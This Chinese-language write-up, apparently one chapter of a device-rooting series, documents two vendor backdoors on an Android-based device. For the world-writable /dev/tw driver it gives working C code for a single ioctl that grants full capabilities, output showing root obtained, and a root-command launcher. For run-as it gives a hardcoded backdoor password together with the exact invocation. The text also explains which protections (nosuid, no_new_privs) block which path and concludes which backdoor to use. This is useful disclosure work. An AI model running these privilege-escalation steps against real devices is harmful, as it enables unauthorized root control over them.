# 02 · 厂商后门：`/dev/tw` 与 `john@tw-desktop`

这两样东西不是漏洞，是**厂商故意留下的**。发现之后整个提权问题就从
「找可利用的内核漏洞」变成了「照着说明书用」。

## `/dev/tw`：一个 ioctl 换来全部能力

### 现象

```
$ ls -l /dev/tw
crw-rw-rw- root root 247, 0 /dev/tw

$ grep 247 /proc/devices
247 tw
```

- 权限 **0666** —— 全世界可读写
- major 247 是内核**内置**驱动 `tw`（不是模块，`lsmod` 为空但 `/proc/devices` 里有）

### 它做什么

对一个 `uid 10055` 的进程直接调用：

```c
int fd = open("/dev/tw", O_RDWR);
ioctl(fd, 0x61ff, 0xa55aa55a);
```

`0x61ff` 拆解为 `_IO(0x61, 0xff)`（无方向位、无 size）。

实测输出：

```
before: uid=10055 euid=10055
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000000000000000
ioctl(0x61ff, 0xa55aa55a) ret=0 errno=0 (Success)
CapInh: 00000000ffffffff
CapPrm: 00000000ffffffff
CapEff: 00000000ffffffff
CapBnd: 0000000000000000
setuid(0) ret=0 errno=0 (Success)
after : uid=0 euid=0
*** ROOT OK ***
```

内核把 `cred->cap_inheritable / cap_permitted / cap_effective`
**全部写成 `0xffffffff`**。拿到 `CAP_SETUID` 之后 `setuid(0)` 自然成功。

`CapBnd`（bounding set）保持不变 —— 说明驱动只改了 cred 的三个位图，
没有动 bounding set，但这已经足够。

### 为什么这是「故意」的

1. 设备节点权限是 `0666`（默认设备节点是 `0600`）
2. ioctl 的 magic 是 `0xa55aa55a`（典型的「魔法数 = 我说了算」写法）
3. 同一颗 `tw` 驱动里还有 `run-as` 用的后门口令（见下）
4. 同族 8.1 固件的内核里能找到完全相同的实现

### 用它拿 root

`src/twroot.c` 就是把这个过程包成一个「以 root 执行任意命令」的启动器：

```bash
./twroot id
# uid=0(root) gid=0(root) groups=...
```

**注意**：判据必须是 `setuid(0)` 是否成功。
只看 `ioctl` 的返回值会被骗 —— `ioctl` 返回 0 不代表能力真的注入了。

## `run-as`：`john@tw-desktop` 口令后门

### 现象

`/system/bin/run-as` 是这台机器上极少数带 setuid 位的文件
（`-rwsr-x--x root system`，9504 字节）。原版 AOSP 的 `run-as` 只做一件事：
以某个 debuggable app 的身份运行命令，**且要求调用者本身是 uid 0 或 2000**。

但在这台机器上，`run-as`、`toolbox`、`libandroid_runtime.so` 里都含有字符串
**`john@tw-desktop`**。这不是包名，也不是用户名 —— 是**写死的口令**。

原版 AOSP 的 `run-as.c` 里绝对没有这个东西：

```c
if (myuid != AID_SHELL && myuid != AID_ROOT) {
    panic("only 'shell' or 'root' users can run this program\n");
}
```

### 后门形态

同族 8.1 固件的 `run-as` 反汇编出来有 4 条分支，其中一条对**任意 uid** 开放：

```
/system/bin/run-as "john@tw-desktop.(9510e9cb-29ba27c0)" sh
```

命中后直接 `setresgid(0,0,0)` / `setresuid(0,0,0)` 然后 exec。
括号里那串 UUID 是另一个分支的标识（OTA 更新器用 `cc05e3f3-09e04af2`）。

### 为什么这条路在本机走不通

`/system` 是 **nosuid** —— setuid 位被内核忽略。
而且 app 进程还带着 `no_new_privs`，即使换成没有 nosuid 的分区也一样被挡。

**但它在同样没有 nosuid 的分区上有用**：我们实测过，把
`/sbin/rootsh`（rootfs，无 nosuid）设成 4755 后，
**从 agent 进程执行仍然是 uid 10055**（`no_new_privs` 生效），
而从 adbd 的 shell 执行才有效（adbd 由 init 启动，没有 `no_new_privs`）。

## 小结

| 后门 | 权限要求 | 本机可用 |
|---|---|---|
| `/dev/tw` ioctl | **无**（0666） | ✅ 两行代码拿 root |
| `run-as` + `john@tw-desktop` | setuid 生效（非 nosuid 分区） | ❌ `/system` nosuid + `no_new_privs` |

**结论：如果这台机器上只能用一样东西，用 `/dev/tw`。**

它连 `no_new_privs` 都不怕 —— 因为能力注入是内核直接改 cred，
不经过 `execve` 的权限提升路径。
